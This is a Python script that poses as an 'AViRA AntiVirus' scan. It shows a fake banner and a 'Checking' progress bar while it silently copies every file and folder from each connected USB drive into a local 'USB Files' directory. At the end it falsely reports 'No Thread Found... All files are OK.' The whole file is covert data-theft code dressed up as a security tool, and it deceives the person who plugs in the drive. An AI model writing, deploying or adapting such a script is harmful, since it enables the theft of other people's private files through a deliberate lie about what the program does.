import getpass
from os import chdir , listdir , path , mkdir
from shutil import copytree , copyfile
from time import sleep

from progressbar import *

class Mains:
    def __init__(self):
## region destination:
        self.username = getpass.getuser()

        self.home = "/home/" + self.username + "/"
        self.dest =  self.home + "USB Files/"

        if "USB Files" not in listdir(self.home):
            chdir(self.home)
            mkdir("USB Files")
## endregion

        print("\n****AViRA AntiVirus***"
      "\nInfo(tags/v3.7.6:43364a7ae0, Dec 29 2019, 00:42:30) [MSC v.1916 64 bit (AMD64)] on win32"
      "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n"
      "Please wait while checking your files...\n")

        self.usb_number()

    def usb_number(self):
        chdir(self.dest)
        lister = listdir('.')
        Directories = []
        for i in lister:
            if path.isdir(i) == True:
                Directories.append(i)

        if len(Directories) == 0:
                self.usbnum = 1
        else:
                self.usbnum = int(max(Directories)) + 1

    def usbdrive(self):
        chdir("/media/"+self.username+"/")
        self.drive_list = listdir('.')

        if self.drive_list.__len__() == 0 :
            print("No USB Connected!!!")
            sleep(4)
            exit()

    def copier(self):
        if len(self.drive_list) > 1 :
            x =0
            while x < len(self.drive_list):
                chdir(self.drive_list[x])
                self.copy()
                x += 1
                self.usbnum += 1
        else:
            chdir(self.drive_list[0])
            self.copy()

    def copy(self):

        pwd = listdir('.')

        Files = []
        Directories = []

        for i in pwd:
            if path.isfile(i) == True:
                Files.append(i)
            if path.isdir(i) == True:
                Directories.append(i)

        widgets = ['Checking: ' , Percentage() , ' ' , Bar(marker='0' , left='[' , right=']') , ' ' , ETA() , ' ' , FileTransferSpeed()]
        bar = ProgressBar(widgets = widgets,maxval=len(pwd))

        x = 1
        bar.start()
        for dir in Directories:
            try:
                copytree(dir, self.dest + str(self.usbnum) + "/" + dir)
                bar.update(x)
                x += 1
            except :
                bar.update(x)
                x += 1
        for file in Files:
            try:
                copyfile(file, self.dest + str(self.usbnum) + "/" + file)
                bar.update(x)
                x += 1
            except :
                bar.update(x)
                x += 1
        bar.finish()

    def final(self):
        print("\n=====No Thread Found=====\n\nAll files are OK.")
        input()

M = Mains()
M.usbdrive()
M.copier()
M.final()